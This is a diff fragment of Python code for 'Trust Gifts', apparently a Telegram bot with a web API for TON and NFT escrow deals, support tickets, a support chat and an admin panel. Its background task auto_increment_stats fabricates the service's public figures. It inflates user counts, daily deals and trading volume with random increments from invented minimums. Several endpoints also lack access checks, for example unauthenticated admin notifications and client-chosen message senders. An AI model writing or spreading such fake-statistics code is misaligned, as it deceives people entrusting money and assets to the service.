+            return web.json_response({'success': False, 'error': 'Ticket not found'}, headers=headers)
+        
+        t = tickets[ticket_id]
+        t["response"] = response
+        t["status"] = "closed"
+        t["answered_at"] = datetime.now().isoformat()
+        t["answered_by"] = user_id
+        save_json(FILES["tickets"], tickets)
+        
+        try:
+            await bot.send_message(
+                t["user_id"],
+                f"📩 ОТВЕТ НА ТИКЕТ #{ticket_id}\n\n{response}\n\n✅ Тикет закрыт"
+            )
+        except:
+            pass
+        
+        return web.json_response({'success': True}, headers=headers)
+    
+    # ===== ЧАТ ПОДДЕРЖКИ =====
+    elif endpoint == '/api/chat_history':
+        session_id = data.get('session_id', 'default')
+        if session_id not in chat_messages:
+            chat_messages[session_id] = []
+        return web.json_response({'success': True, 'messages': chat_messages[session_id]}, headers=headers)
+    
+    elif endpoint == '/api/chat_send':
+        session_id = data.get('session_id', 'default')
+        text = data.get('text')
+        sender = data.get('sender', 'user')
+        
+        if not user_id or not text:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        if session_id not in chat_messages:
+            chat_messages[session_id] = []
+        
+        msg = {
+            "id": "m" + str(uuid.uuid4())[:8],
+            "text": text,
+            "sender": sender,
+            "user_id": user_id,
+            "timestamp": datetime.now().isoformat(),
+            "status": "sent"
+        }
+        chat_messages[session_id].append(msg)
+        save_json(FILES["chat_messages"], chat_messages)
+        
+        # Если сообщение от пользователя — уведомляем админа
+        if sender == 'user':
+            await log_to_master(
+                f"💬 НОВОЕ СООБЩЕНИЕ В ЧАТЕ ПОДДЕРЖКИ\n\n"
+                f"👤 Пользователь: @{user.username} (ID: {user_id})\n"
+                f"📝 {text}\n\n"
+                f"📌 Для ответа используйте:\n/chat_reply {session_id} [ваш ответ]"
+            )
+        
+        return web.json_response({'success': True, 'message': msg}, headers=headers)
+    
+    elif endpoint == '/api/chat_admin_reply':
+        if not is_admin(user_id):
+            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
+        
+        session_id = data.get('session_id', 'default')
+        response = data.get('text')
+        
+        if not session_id or not response:
+            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
+        
+        if session_id not in chat_messages:
+            chat_messages[session_id] = []
+        
+        msg = {
+            "id": "m" + str(uuid.uuid4())[:8],
+            "text": response,
+            "sender": "admin",
+            "timestamp": datetime.now().isoformat(),
+            "status": "sent"
+        }
+        chat_messages[session_id].append(msg)
+        save_json(FILES["chat_messages"], chat_messages)
+        
+        # Отправляем пользователю
+        try:
+            target_user_id = None
+            for m in chat_messages.get(session_id, []):
+                if m.get("sender") == "user" and m.get("user_id"):
+                    target_user_id = m.get("user_id")
+                    break
+            
+            if target_user_id:
+                await bot.send_message(
+                    target_user_id,
+                    f"📩 НОВЫЙ ОТВЕТ В ЧАТЕ ПОДДЕРЖКИ\n\n{response}\n\n⬇️ Перейдите в Mini App",
+                    reply_markup=mini_app_keyboard("📱 Открыть чат", "support")
+                )
+        except:
+            pass
+        
+        return web.json_response({'success': True}, headers=headers)
+    
+    # ===== АДМИН ПАНЕЛЬ ДАННЫЕ =====
+    elif endpoint == '/api/admin_panel_data':
+        if not is_admin(user_id):
+            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
+        
+        return web.json_response({
+            'success': True,
+            'stats': {
+                'users': len(balance),
+                'deals': len(deals),
+                'active_deals': len([d for d in deals.values() if d.get('status') in ['waiting_payment', 'paid', 'awaiting_confirmation']]),
+                'completed_deals': len([d for d in deals.values() if d.get('status') == 'completed']),
+                'volume': round(sum(d.get('amount', 0) for d in deals.values() if d.get('currency') == 'TON'), 1),
+                'tickets': len([t for t in tickets.values() if t.get('status') == 'open'])
+            },
+            'deals': list(deals.values())[-20:],
+            'tickets': list(tickets.values())[-10:],
+            'withdraw_requests': [r for r in withdraw_requests.values() if r.get('status') == 'pending'],
+            'verification_requests': [r for r in verification_requests.values() if r.get('status') == 'pending']
+        }, headers=headers)
+    
+    # ===== УВЕДОМЛЕНИЕ АДМИНА =====
+    elif endpoint == '/api/notify_admin':
+        text = data.get('text', '')
+        await log_to_master(text)
+        return web.json_response({'success': True}, headers=headers)
+    
+    return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)
+
+# ============================================================
+# 15. ФОНОВЫЙ ПРОЦЕСС
+# ============================================================
+async def auto_increment_stats():
+    while True:
+        try:
+            stats_data = load_json(FILES["stats"])
+            
+            if not stats_data:
+                stats_data = {}
+            
+            MIN_USERS = 21374
+            MIN_DEALS_TODAY = 1264
+            MIN_VOLUME = 47.6
+            
+            stats_data['users'] = stats_data.get('users', MIN_USERS) + random.randint(1, 5)
+            stats_data['deals_today'] = stats_data.get('deals_today', MIN_DEALS_TODAY) + random.randint(0, 2)
+            stats_data['volume'] = round(stats_data.get('volume', MIN_VOLUME) + random.uniform(0.01, 0.15), 1)
+            
+            if stats_data['users'] < MIN_USERS:
+                stats_data['users'] = MIN_USERS + random.randint(100, 500)
+            if stats_data['deals_today'] < MIN_DEALS_TODAY:
+                stats_data['deals_today'] = MIN_DEALS_TODAY + random.randint(20, 50)
+            if stats_data['volume'] < MIN_VOLUME:
+                stats_data['volume'] = round(MIN_VOLUME + random.uniform(0.5, 2.0), 1)
+            
+            save_json(FILES["stats"], stats_data)
+            
+        except Exception as e:
+            print(f"Ошибка автонакрутки: {e}")
+        
+        await asyncio.sleep(300)
+
+# ============================================================
+# 16. ЗАПУСК
+# ============================================================
+async def start_web_server():
+    app = web.Application()
+    app.router.add_route('*', '/{path:.*}', handle_api)
+    port = int(os.environ.get('PORT', 3000))
+    print(f"🌐 API сервер запущен на порту {port}")
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, '0.0.0.0', port)
+    await site.start()
+    return runner
+
+async def main():
+    print("=" * 50)
+    print("🏦 Trust Gifts Бот")
+    print("=" * 50)
+    print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
+    print(f"🤖 Бот: @{BOT_USERNAME}")
+    print(f"📱 Mini App: {MINI_APP_URL}")
+    print(f"🖼️ NFT эскроу: @{NFT_ESCROW_ACCOUNT}")
+    print("=" * 50)
+    
+    asyncio.create_task(auto_increment_stats())
+    
+    await start_web_server()
+    print("✅ Бот готов к работе!")
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
